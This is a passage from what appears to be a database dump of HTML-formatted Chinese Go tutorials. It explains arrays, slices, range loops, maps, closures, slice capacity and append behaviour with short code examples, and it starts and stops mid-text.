struct {\r\n    X, Y int\r\n}\r\n \r\nfunc main() {\r\n    v := new(Vertex)\r\n    fmt.Println(v)\r\n    v.X, v.Y = 11, 9\r\n    fmt.Println(v)\r\n}\r\n</code></pre>\r\n\r\n<p><strong>数组和 slice</strong></p>\r\n\r\n<p>[n]T 在 Golang 中是一个类型（就像 *T 一样），表示一个长度为 n 的数组其元素类型为 T。范例：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport \"fmt\"\r\n \r\nfunc main() {\r\n    var a [2]string\r\n    a[0] = \"Hello\"\r\n    a[1] = \"World\"\r\n    fmt.Println(a[0], a[1])\r\n    fmt.Println(a)\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>注意，数组长度无法被改变。</p>\r\n\r\n<p>slice 是一个数据结构，其指向一个数组某个连续的部分。slice 用起来很像数组。[]T 为 slice 类型，其中元素类型为 T：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nfunc main() {\r\n    // 构建一个 slice\r\n    p := []int{2, 3, 5, 7, 11, 13}\r\n    fmt.Println(\"p ==\", p)\r\n \r\n    for i := 0; i &lt; len(p); i++ {\r\n        fmt.Printf(\"p[%d] == %d\\n\", i, p[i])\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>表达式 s[lo:hi] 用于创建一个 slice，新创建的 slice 的元素为 s 中 [lo, hi) 位置的元素。</p>\r\n\r\n<p>创建 slice 使用 make 函数（而不是用 new 函数，因为需要设置额外的参数来控制 slice 的创建）：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">// len(a) 为 5\r\na := make([]int, 5)\r\n</code></pre>\r\n\r\n<p>这里 make 函数会创建一个数组（其元素初始化为 0）并返回一个 slice 指向此数组。make 可以带第三个参数，用于指定容量：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">// len(b) 为 0\r\n// cap(b) 为 5\r\nb := make([]int, 0, 5)\r\n \r\nb = b[:cap(b)] // len(b)=5, cap(b)=5\r\nb = b[1:] // len(b)=4, cap(b)=4</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>一个没有值的 slice 是 nil，长度和容量都为 0。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\npackage main\r\n \r\nimport \"fmt\"\r\n \r\nfunc main() {\r\n    var z []int\r\n    fmt.Println(z, len(z), cap(z))\r\n    if z == nil {\r\n        fmt.Println(\"nil!\")\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p><strong>range</strong></p>\r\n\r\n<p>range 被用在 for 中来迭代一个 slice 或者一个 map：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nvar s = []int{1, 2, 3}\r\n \r\nfunc main() {\r\n    for i, v := range s {\r\n        fmt.Println(i, v)\r\n    }\r\n \r\n    // 只需要值，使用 _ 忽略索引\r\n    for _, v := range s {\r\n        fmt.Println(v)\r\n    }\r\n \r\n    // 只需要索引\r\n    for i := range s {\r\n        fmt.Println(i)\r\n    }\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>map</strong></p>\r\n\r\n<p>map 用于映射 key 到 value（值）。map 可以通过 make 来创建（而非 new）：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\ntype Vertex struct {\r\n    Lat, Long float64\r\n}\r\n \r\nvar m map[string]Vertex\r\n \r\nfunc main() {\r\n    m = make(map[string]Vertex)\r\n    m[\"Bell Labs\"] = Vertex{\r\n        40.68433, -74.39967,\r\n    }\r\n    fmt.Println(m[\"Bell Labs\"])\r\n}\r\n\r\n\r\n\r\nmap iteral 很像 struct literal：</code></pre>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var m = map[string]Vertex{\r\n    // 这里 Vertex 可以省略不写\r\n    \"Bell Labs\": Vertex{\r\n        40.68433, -74.39967,\r\n    },\r\n    \"Google\": Vertex{\r\n        37.42202, -122.08408,\r\n    },\r\n}</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>使用 [] 来访问 map 中的值，使用 delete 来删除 map 中的值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">m[key] = elem\r\nelem = m[key]\r\ndelete(m, key)</code></pre>\r\n\r\n<p><br />\r\n如果需要检查 map 中某 key 是否存在使用：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">elem, ok = m[key]\r\n\r\n\r\nelem 表示 key 的值（key 不存在时，elem 为 0），ok 表示 key 是否存在。</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>闭包</strong></p>\r\n\r\n<p>Golang 中函数也是一个值（就像 int 值一样），且函数可以是一个闭包。闭包是一个引用了外部变量的函数。看一个例子：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">package main\r\n \r\nimport \"fmt\"\r\n \r\nfunc adder() func(int) int {\r\n    sum := 0\r\n    // 返回一个闭包，此闭包引用了外部变量 sum\r\n    return func(x int) int {\r\n        sum += x\r\n        return sum\r\n    }\r\n}\r\n \r\nfunc main() {\r\n    a := adder()\r\n    fmt.Println(a(9527))\r\n}</code></pre>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n',0,0,'Golang极简入门教程（一）：基本概念',26,NULL,0),(70,0,'20150823093635',2,'<p><strong>Array(数组)</strong></p>\r\n\r\n<p><strong>内部机制</strong></p>\r\n\r\n<p>在 Go 语言中数组是固定长度的数据类型，它包含相同类型的连续的元素，这些元素可以是内建类型，像数字和字符串，也可以是结构类型，元素可以通过唯一的索引值访问，从 0 开始。</p>\r\n\r\n<p>数组是很有价值的数据结构，因为它的内存分配是连续的，内存连续意味着可是让它在 CPU 缓存中待更久，所以迭代数组和移动元素都会非常迅速。</p>\r\n\r\n<p><strong>数组声明和初始化</strong></p>\r\n\r\n<p>通过指定数据类型和元素个数(数组长度)来声明数组。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 声明一个长度为5的整数数组<br />\r\nvar array [5]int</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>一旦数组被声明了，那么它的数据类型跟长度都不能再被改变。如果你需要更多的元素，那么只能创建一个你想要长度的新的数组，然后把原有数组的元素拷贝过去。</p>\r\n\r\n<p>Go 语言中任何变量被声明时，都会被默认初始化为各自类型对应的 0 值，数组当然也不例外。当一个数组被声明时，它里面包含的每个元素都会被初始化为 0 值。</p>\r\n\r\n<p>一种快速创建和初始化数组的方法是使用数组字面值。数组字面值允许我们声明我们需要的元素个数并指定数据类型：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">// 声明一个长度为5的整数数组\r\n// 初始化每个元素\r\narray := [5]int{7, 77, 777, 7777, 77777}</code></pre>\r\n\r\n<p><br />\r\n如果你把长度写成 ...，Go 编译器将会根据你的元素来推导出长度：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">// 通过初始化值的个数来推导出数组容量\r\narray := [...]int{7, 77, 777, 7777, 77777}\r\n</code></pre>\r\n\r\n<p>如果我们知道想要数组的长度，但是希望对指定位置元素初始化，可以这样：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\n// 声明一个长度为5的整数数组\r\n// 为索引为1和2的位置指定元素初始化\r\n// 剩余元素为0值\r\narray := [5]int{1: 77, 2: 777}\r\n</code></pre>\r\n\r\n<p><strong>使用数组</strong></p>\r\n\r\n<p>使用 [] 操作符来访问数组元素：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\narray := [5]int{7, 77, 777, 7777, 77777}\r\n// 改变索引为2的元素的值\r\narray[2] = 1</code></pre>\r\n\r\n<p><br />\r\n我们可以定义一个指针数组：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">array := [5]*int{0: new(int), 1: new(int)}\r\n\r\n\r\n\r\n// 为索引为0和1的元素赋值\r\n*array[0] = 7\r\n*array[1] = 77\r\n</code></pre>\r\n\r\n<p>在 Go 语言中数组是一个值，所以可以用它来进行赋值操作。一个数组可以被赋值给任意相同类型的数组：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array1 [5]string\r\narray2 := [5]string{\"Red\", \"Blue\", \"Green\", \"Yellow\", \"Pink\"}\r\narray1 = array2\r\n</code></pre>\r\n\r\n<p>注意数组的类型同时包括数组的长度和可以被存储的元素类型，数组类型完全相同才可以互相赋值，比如下面这样就不可以：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array1 [4]string\r\narray2 := [5]string{\"Red\", \"Blue\", \"Green\", \"Yellow\", \"Pink\"}\r\narray1 = array2\r\n\r\n\r\n\r\n// 编译器会报错\r\nCompiler Error:\r\ncannot use array2 (type [5]string) as type [4]string in assignment\r\n</code></pre>\r\n\r\n<p>拷贝一个指针数组实际上是拷贝指针值，而不是指针指向的值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array1 [3]*string\r\narray2 := [3]*string{new(string), new(string), new(string)}\r\n*array2[0] = \"Red\"\r\n*array2[1] = \"Blue\"\r\n*array2[2] = \"Green\"\r\n\r\n\r\n\r\narray1 = array2\r\n// 赋值完成后，两组指针数组指向同一字符串</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>多维数组</strong></p>\r\n\r\n<p>数组总是一维的，但是可以组合成多维的。多维数组通常用于有父子关系的数据或者是坐标系数据：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">// 声明一个二维数组\r\nvar array [4][2]int\r\n\r\n\r\n\r\n// 使用数组字面值声明并初始化\r\narray := [4][2]int{{10, 11}, {20, 21}, {30, 31}, {40, 41}}\r\n\r\n// 指定外部数组索引位置初始化\r\narray := [4][2]int{1: {20, 21}, 3: {40, 41}}\r\n\r\n// 同时指定内外部数组索引位置初始化\r\narray := [4][2]int{1: {0: 20}, 3: {1: 41}}\r\n</code></pre>\r\n\r\n<p>同样通过 [] 操作符来访问数组元素：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array [2][2]int\r\n\r\n\r\n\r\narray[0][0] = 0\r\narray[0][1] = 1\r\narray[1][0] = 2\r\narray[1][1] = 3\r\n</code></pre>\r\n\r\n<p>也同样的相同类型的多维数组可以相互赋值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array1 = [2][2]int\r\nvar array2 = [2][2]int\r\n\r\n\r\n\r\narray[0][0] = 0\r\narray[0][1] = 1\r\narray[1][0] = 2\r\narray[1][1] = 3\r\n\r\narray1 = array2\r\n</code></pre>\r\n\r\n<p>因为数组是值，我们可以拷贝单独的维：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array3 [2]int = array1[1]\r\nvar value int = array1[1][0]\r\n</code></pre>\r\n\r\n<p><strong>在函数中传递数组</strong></p>\r\n\r\n<p>在函数中传递数组是非常昂贵的行为，因为在函数之间传递变量永远是传递值，所以如果变量是数组，那么意味着传递整个数组，即使它很大很大很大。。。</p>\r\n\r\n<p>举个栗子，创建一个有百万元素的整形数组，在64位的机器上它需要8兆的内存空间，来看看我们声明它和传递它时发生了什么：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">var array [1e6]int\r\nfoo(array)\r\nfunc foo(array [1e6]int) {\r\n  ...\r\n}</code></pre>\r\n\r\n<p><br />\r\n每一次 foo 被调用，8兆内存将会被分配在栈上。一旦函数返回，会弹栈并释放内存，每次都需要8兆空间。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Go 语言当然不会这么傻，有更好的方法来在函数中传递数组，那就是传递指向数组的指针，这样每次只需要分配8字节内存：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">\r\nvar array [1e6]int\r\nfoo(&amp;array)\r\nfunc foo(array *[1e6]int){\r\n  ...\r\n}\r\n</code></pre>\r\n\r\n<p>但是注意如果你在函数中改变指针指向的值，那么原始数组的值也会被改变。幸运的是 slice(切片)可以帮我们处理好这些问题，来一起看看。</p>\r\n\r\n<p><strong>Slice(切片)</strong></p>\r\n\r\n<p><strong>内部机制和基础</strong></p>\r\n\r\n<p>slice 是一种可以动态数组，可以按我们的希望增长和收缩。它的增长操作很容易使用，因为有内建的 append 方法。我们也可以通过 relice 操作化简 slice。因为 slice 的底层内存是连续分配的，所以 slice 的索引，迭代和垃圾回收性能都很好。</p>\r\n\r\n<p>slice 是对底层数组的抽象和控制。它包含 Go 需要对底层数组管理的三种元数据，分别是：</p>\r\n\r\n<p>1.指向底层数组的指针<br />\r\n2.slice 中元素的长度<br />\r\n3.slice 的容量(可供增长的最大值)</p>\r\n\r\n<p><strong>创建和初始化</strong></p>\r\n\r\n<p>Go 中创建 slice 有很多种方法，我们一个一个来看。</p>\r\n\r\n<p>第一个方法是使用内建的函数 make。当我们使用 make 创建时，一个选项是可以指定 slice 的长度：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := make([]string, 5)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果只指定了长度，那么容量默认等于长度。我们可以分别指定长度和容量：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := make([]int, 3, 5)</p>\r\n\r\n<p><br />\r\n当我们分别指定了长度和容量，我们创建的 slice 就可以拥有一开始并没有访问的底层数组的容量。上面代码的 slice 中，可以访问3个元素，但是底层数组有5个元素。两个与长度不相干的元素可以被 slice 来用。新创建的 slice 同样可以共享底层数组和已存在的容量。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>不允许创建长度大于容量的 slice：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := make([]int, 5, 3)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Compiler Error:<br />\r\nlen larger than cap in make([]int)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>惯用的创建 slice 的方法是使用 slice 字面量。跟创建数组很类似，不过不用指定 []里的值。初始的长度和容量依赖于元素的个数：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 创建一个字符串 slice<br />\r\n// 长度和容量都是 5<br />\r\nslice := []string{&quot;Red&quot;, &quot;Blue&quot;, &quot;Green&quot;, &quot;Yellow&quot;, &quot;Pink&quot;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在使用 slice 字面量创建 slice 时有一种方法可以初始化长度和容量，那就是初始化索引。下面是个例子：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 创建一个字符串 slice<br />\r\n// 初始化一个有100个元素的空的字符串 slice<br />\r\nslice := []string{99: &quot;&quot;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>nil 和 empty slice</strong></p>\r\n\r\n<p>有的时候我们需要创建一个 nil slice，创建一个 nil slice 的方法是声明它但不初始化它：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nvar slice []int</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>创建一个 nil slice 是创建 slice 最基本的方法，很多标准库和内建函数都可以使用它。当我们想要表示一个并不存在的 slice 时它变得非常有用，比如一个返回 slice 的函数中发生异常的时候。</p>\r\n\r\n<p>创建 empty slice 的方法就是声明并初始化一下：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 使用 make 创建<br />\r\nsilce := make([]int, 0)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 使用 slice 字面值创建<br />\r\nslice := []int{}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>empty slice 包含0个元素并且底层数组没有分配存储空间。当我们想要表示一个空集合时它很有用处，比如一个数据库查询返回0个结果。</p>\r\n\r\n<p>不管我们用 nil slice 还是 empty slice，内建函数 append，len和cap的工作方式完全相同。</p>\r\n\r\n<p><strong>使用 slice</strong></p>\r\n\r\n<p>为一个指定索引值的 slice 赋值跟之前数组赋值的做法完全相同。改变单个元素的值使用 [] 操作符：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40, 50}<br />\r\nslice[1] = 25</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我们可以在底层数组上对一部分数据进行 slice 操作，来创建一个新的 slice：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 长度为5，容量为5<br />\r\nslice := []int{10, 20, 30, 40, 50}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 长度为2，容量为4<br />\r\nnewSlice := slice[1:3]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在 slice 操作之后我们得到了两个 slice，它们共享底层数组。但是它们能访问底层数组的范围却不同，newSlice 不能访问它头指针前面的值。</p>\r\n\r\n<p>计算任意 new slice 的长度和容量可以使用下面的公式：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n对于 slice[i:j] 和底层容量为 k 的数组<br />\r\n长度：j - i<br />\r\n容量：k - i</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>必须再次明确一下现在是两个 slice 共享底层数组，因此只要有一个 slice 改变了底层数组的值，那么另一个也会随之改变：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40, 50}<br />\r\nnewSlice := slice[1:3]<br />\r\nnewSlice[1] = 35</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>改变 newSlice 的第二个元素的值，也会同样改变 slice 的第三个元素的值。</p>\r\n\r\n<p>一个 slice 只能访问它长度范围内的索引，试图访问超出长度范围的索引会产生一个运行时错误。容量只可以用来增长，它只有被合并到长度才可以被访问：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40, 50}<br />\r\nnewSlice := slice[1:3]<br />\r\nnewSlice[3] = 45</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Runtime Exception:<br />\r\npanic: runtime error: index out of range</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>容量可以被合并到长度里，通过内建的 append 函数。</p>\r\n\r\n<p><strong>slice 增长</strong></p>\r\n\r\n<p>slice 比 数组的优势就在于它可以按照我们的需要增长，我们只需要使用 append 方法，然后 Go 会为我们做好一切。</p>\r\n\r\n<p>使用 append 方法时我们需要一个源 slice 和需要附加到它里面的值。当 append 方法返回时，它返回一个新的 slice，append 方法总是增长 slice 的长度，另一方面，如果源 slice 的容量足够，那么底层数组不会发生改变，否则会重新分配内存空间。</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 创建一个长度和容量都为5的 slice<br />\r\nslice := []int{10, 20, 30, 40, 50}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 创建一个新的 slice<br />\r\nnewSlice := slice[1:3]</p>\r\n\r\n<p>// 为新的 slice append 一个值<br />\r\nnewSlice = append(newSlice, 60)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>因为 newSlice 有可用的容量，所以在 append 操作之后 slice 索引为 3 的值也变成了 60，之前说过这是因为 slice 和 newSlice 共享同样的底层数组。</p>\r\n\r\n<p>如果没有足够可用的容量，append 函数会创建一个新的底层数组，拷贝已存在的值和将要被附加的新值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n// 创建长度和容量都为4的 slice<br />\r\nslice := []int{10, 20, 30, 40}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 附加一个新值到 slice，因为超出了容量，所以会创建新的底层数组<br />\r\nnewSlice := append(slice, 50)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>append 函数重新创建底层数组时，容量会是现有元素的两倍(前提是元素个数小于1000)，如果元素个数超过1000，那么容量会以 1.25 倍来增长。</p>\r\n\r\n<p><strong>slice 的第三个索引参数</strong></p>\r\n\r\n<p>slice 还可以有第三个索引参数来限定容量，它的目的不是为了增加容量，而是提供了对底层数组的一个保护机制，以方便我们更好的控制 append 操作，举个栗子：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nsource := []string{&quot;apple&quot;, &quot;orange&quot;, &quot;plum&quot;, &quot;banana&quot;, &quot;grape&quot;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 接着我们在源 slice 之上创建一个新的 slice<br />\r\nslice := source[2:3:4]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>新创建的 slice 长度为 1，容量为 2，可以看出长度和容量的计算公式也很简单：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\n对于 slice[i:j:k]&nbsp; 或者 [2:3:4]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>长度： j - i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 或者&nbsp;&nbsp; 3 - 2<br />\r\n容量： k - i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 或者&nbsp;&nbsp; 4 - 2</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果我们试图设置比可用容量更大的容量，会得到一个运行时错误：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := source[2:3:6]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><br />\r\nRuntime Error:<br />\r\npanic: runtime error: slice bounds out of range</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>限定容量最大的用处是我们在创建新的 slice 时候限定容量与长度相同，这样以后再给新的 slice 增加元素时就会分配新的底层数组，而不会影响原有 slice 的值：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nsource := []string{&quot;apple&quot;, &quot;orange&quot;, &quot;plum&quot;, &quot;banana&quot;, &quot;grape&quot;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 接着我们在源 slice 之上创建一个新的 slice<br />\r\n// 并且设置长度和容量相同<br />\r\nslice := source[2:3:3]</p>\r\n\r\n<p>// 添加一个新元素<br />\r\nslice = append(slice, &quot;kiwi&quot;)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果没有第三个索引参数限定，添加 kiwi 这个元素时就会覆盖掉 banana。</p>\r\n\r\n<p>内建函数 append 是一个变参函数，意思就是你可以一次添加多个元素，比如：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\ns1 := []int{1, 2}<br />\r\ns2 := []int{3, 4}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>fmt.Printf(&quot;%v\\n&quot;, append(s1, s2...))</p>\r\n\r\n<p>Output:<br />\r\n[1 2 3 4]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>迭代 slice</strong></p>\r\n\r\n<p>slice 也是一种集合，所以可以被迭代，用 for 配合 range 来迭代：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40, 50}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for index, value := range slice {<br />\r\n&nbsp; fmt.Printf(&quot;Index: %d&nbsp; Value: %d\\n&quot;, index, value)<br />\r\n}</p>\r\n\r\n<p>Output:<br />\r\nIndex: 0&nbsp; Value: 10<br />\r\nIndex: 1&nbsp; Value: 20<br />\r\nIndex: 2&nbsp; Value: 30<br />\r\nIndex: 3&nbsp; Value: 40<br />\r\nIndex: 4&nbsp; Value: 50</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>当迭代时 range 关键字会返回两个值，第一个是索引值，第二个是索引位置值的拷贝。注意：返回的是值的拷贝而不是引用，如果我们把值的地址作为指针使用，会得到一个错误，来看看为啥：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30 ,40}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for index, value := range slice {<br />\r\n&nbsp; fmt.Printf(&quot;Value: %d&nbsp; Value-Addr: %X&nbsp; ElemAddr: %X\\n&quot;, value, &amp;value, &amp;slice[index])<br />\r\n}</p>\r\n\r\n<p>Output:<br />\r\nValue: 10&nbsp; Value-Addr: 10500168&nbsp; ElemAddr: 1052E100<br />\r\nValue: 20&nbsp; Value-Addr: 10500168&nbsp; ElemAddr: 1052E104<br />\r\nValue: 30&nbsp; Value-Addr: 10500168&nbsp; ElemAddr: 1052E108<br />\r\nValue: 40&nbsp; Value-Addr: 10500168&nbsp; ElemAddr: 1052E10C</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>value 变量的地址总是相同的因为它只是包含一个拷贝。如果想得到每个元素的真是地址可以使用 &amp;slice[index]。</p>\r\n\r\n<p>如果不需要索引值，可以使用 _ 操作符来忽略它：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for _, value := range slice {<br />\r\n&nbsp; fmt.Printf(&quot;Value: %d\\n&quot;, value)<br />\r\n}</p>\r\n\r\n<p><br />\r\nOutput:<br />\r\nValue: 10<br />\r\nValue: 20<br />\r\nValue: 30<br />\r\nValue: 40</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>range 总是从开始一次遍历，如果你想控制遍历的step，就用传统的 for 循环：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := []int{10, 20, 30, 40}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for index := 2; index &lt; len(slice); index++ {<br />\r\n&nbsp; fmt.Printf(&quot;Index: %d&nbsp; Value: %d\\n&quot;, index, slice[index])<br />\r\n}</p>\r\n\r\n<p><br />\r\nOutput:<br />\r\nIndex: 2&nbsp; Value: 30<br />\r\nIndex: 3&nbsp; Value: 40</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>同数组一样，另外两个内建函数 len 和 cap 分别返回 slice 的长度和容量。</p>\r\n\r\n<p><strong>多维 slice</strong></p>\r\n\r\n<p>也是同数组一样，slice 可以组合为多维的 slice：</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := [][]int{{10}, {20, 30}}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>需要注意的是使用 append 方法时的行为，比如我们现在对 slice[0] 增加一个元素：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><u>复制代码</u> 代码如下:</p>\r\n\r\n<p><br />\r\nslice := [][]int{{10}, {20, 30}}<br />\r\nslice[0] = append(slice[0], 20)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>那么只有 slice[0] 会重新创建底层数组，slice[1] 则不会。</p>\r\n\r\n<p><strong>在函数间传递 slice</strong></p>\r\n\r\n<p>在函数间传递 slice 是很廉价的，因为 slice 相当于是指向底层数组的指针，让我们创建一个很大的 slice 